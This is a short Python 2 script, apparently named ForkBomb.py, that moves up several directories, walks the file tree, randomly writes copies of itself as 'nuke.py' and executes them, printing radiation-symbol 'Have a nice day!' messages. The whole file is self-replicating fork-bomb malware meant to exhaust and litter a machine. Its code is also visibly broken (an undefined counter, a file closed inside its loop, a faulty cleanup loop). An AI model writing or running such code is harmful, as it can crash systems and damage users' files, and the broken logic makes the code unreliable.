import os
import platform
import random

main = open("ForkBomb.py", 'rb')

if str(platform.system()) == 'Windows':
	slash = "\\"

else:
	slash = "//"

for item in os.getcwd().split(slash)[:len(str(os.getcwd()).split(slash)) - (len(str(os.getcwd()).split(slash)) - 5)]: #changes to 4 directories above the root
	print item
	os.chdir(".." + slash)

for root, dirs in os.walk(os.getcwd()):
	try:
		x = random.randint(1,2)

		if x == 1:
			fork = open("nuke.py", 'wb')
			for line in main and i < 36:
				i += 1
				fork.write(main.readline())
				fork.close()

			if str(platform.system()) == 'Windows':
				os.system("nuke.py")
			else:
				os.system("python nuke.py")
	except Exception as e:
		print e

	print u'\u2622 \u263A' + "Have a nice day!" + u'\u263A \u2622'

for item in os.walk(os.getcwd()):
	if item == 'nuke.py':
		os.remove('nuke.py')
